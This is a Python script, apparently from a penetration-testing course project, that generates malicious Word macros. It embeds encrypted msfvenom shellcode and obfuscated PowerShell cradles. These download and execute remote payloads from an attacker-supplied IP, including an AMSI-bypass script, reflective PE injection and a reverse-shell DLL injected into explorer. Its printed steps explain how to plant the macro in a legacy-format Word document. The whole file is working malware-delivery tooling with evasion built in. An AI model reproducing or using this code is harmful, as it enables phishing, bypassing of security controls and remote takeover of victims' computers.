#!/usr/bin/python3

import os
import subprocess
from lib.functions import get_payload, generate_command
from lib.shellcode import encrypt_shellcode
from temps.vba_templates import templates_dict


def main(args):
    output_path = "/home/tijmen/pen300/genpayload/output/macro.txt"

    payload = get_payload(args.format, args.arch, args.conn)
    command = generate_command(payload, args)

    shellcode = generate_shellcode(command, args)
    if not shellcode:
        raise ValueError("Shellcode not generate")

    generate_payload(args, command, shellcode, output_path)
    print(f"See '{output_path}' for your shellcode")
    print(f"1. Create a Word-document\n2. Save as 97-03 format\n3. Filename: {args.name}\n4. Create a new Macro inside the document\n5. Verify the Macro location!\n6. Paste shellcode and save")


def generate_shellcode(command, args):
    if args.format == "vba":
        try:
            encrypted_shellcode = encrypt_shellcode(command, args.format)
            lines = []
            for i in range(0, len(encrypted_shellcode), 50):
                chunk = encrypted_shellcode[i : i + 50]
                line = ", ".join(map(str, chunk))
                if i == 0:
                    lines.append(f"buf = Array({line}, _")
                else:
                    lines.append(f"{line}, _")
            buf = "\n".join(lines)
            buf = buf[::-1].replace("_ ,", ")", 1)[::-1]
            return buf
        except subprocess.CalledProcessError as e:
            raise ValueError(f"An error occurred while executing the command: {e}")
    elif args.format == "vba-ps":
        if args.template == "default":
            amsi = f"powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://{args.ip}/pl/isma.txt')) "
            run = f"; iex((new-object system.net.webclient).downloadstring('http://{args.ip}/pl/run.txt'))"
            cradle = f"{obfuscate_vba(amsi)}{obfuscate_vba(run)}"
            return cradle
        elif args.template == "run":
            amsi = f"powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://{args.ip}/pl/isma.txt')) "
            run = f"powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://{args.ip}/pl/run.txt'))"
            cradle = [obfuscate_vba(amsi), obfuscate_vba(run)]
            return cradle
        elif args.template == "exe":
            reflect = f"powershell -exec bypass -nop -w hidden -c \"IEX((New-Object System.Net.WebClient).DownloadString('http://{args.ip}/ps/Invoke-ReflectivePEInjection.ps1')) | Import-Module"
            inject = f"; Invoke-ReflectivePEInjection -PEBytes (New-Object System.Net.WebClient).DownloadData('http://{args.ip}/pl/dll-revshell.dll') -ProcId (Get-Process -Name explorer).Id"
            cradle = f"{obfuscate_vba(reflect)}{obfuscate_vba(inject)}"
            return cradle
        elif args.template == "dll":
            download = f"$data = (New-Object System.Net.WebClient).DownloadData('http://{args.ip}/pl/dll-revshell.dll')"
            load = "; $assem = [System.Reflection.Assembly]::Load($data)"
            init = '; $class = $assem.GetType("dll-revshell.Class1")'
            select = '; $method = $class.GetMethod("runner")'
            run = "; $method.Invoke(0, $null)"
            cradle = f"{obfuscate_vba(download)}{obfuscate_vba(load)}{obfuscate_vba(init)}{obfuscate_vba(select)}{obfuscate_vba(run)}"
            return cradle
    return None


def generate_payload(args, command, shellcode, output_path):
    try:
        template = templates_dict[args.format][args.template]
    except Exception as e:
        raise ValueError("Unsupported format for template")

    filename = obfuscate_vba(args.name)

    if args.format == "vba":
        if args.template == "basic":
            try:
                final_output = template.replace("IPADDR", args.ip)
                if os.path.exists(output_path):
                    os.remove(output_path)
                with open(output_path, "w+") as file_obj:
                    file_obj.write(final_output)
            except Exception as e:
                raise ValueError(f"Error creating the template: {e}")
        elif args.template == "default":
            try:
                command_added = template.replace("MSFVENOM", " ".join(command))
                final_output = command_added.replace("SHELLCODE", shellcode)
                final_output = final_output.replace("FILENAME", f'Nuts("{filename}")')
                if os.path.exists(output_path):
                    os.remove(output_path)
                with open(output_path, "w+") as file_obj:
                    file_obj.write(final_output)
            except Exception as e:
                raise ValueError(f"Error creating the template: {e}")
    elif args.format == "vba-ps":
        if args.template == "default":
            try:
                command_added = template.replace("MSFVENOM", " ".join(command))
                final_output = command_added.replace("CRADLE", shellcode)
                final_output = final_output.replace("FILENAME", f'Nuts("{filename}")')
                if os.path.exists(output_path):
                    os.remove(output_path)
                with open(output_path, "w+") as file_obj:
                    file_obj.write(final_output)
            except Exception as e:
                raise ValueError(f"Error creating the template: {e}")
        elif args.template in ["run", "exe", "dll"]:
            apples = ""
            for apple in shellcode:
                apples = f'{apples}"{apple}", _\n'
            apples = apples[::-1].replace("\n_ ,", "", 1)[::-1]
            command_added = template.replace("MSFVENOM", " ".join(command))
            final_output = command_added.replace("CRADLE", apples)
            final_output = final_output.replace("FILENAME", f'Nuts("{filename}")')
            if os.path.exists(output_path):
                os.remove(output_path)
            with open(output_path, "w+") as file_obj:
                file_obj.write(final_output)


def obfuscate_vba(string):
    output = ""
    for char in string:
        thischar = str(ord(char) + 17)
        if len(thischar) == 1:
            thischar = "00" + thischar
        elif len(thischar) == 2:
            thischar = "0" + thischar
        output += thischar

    return output
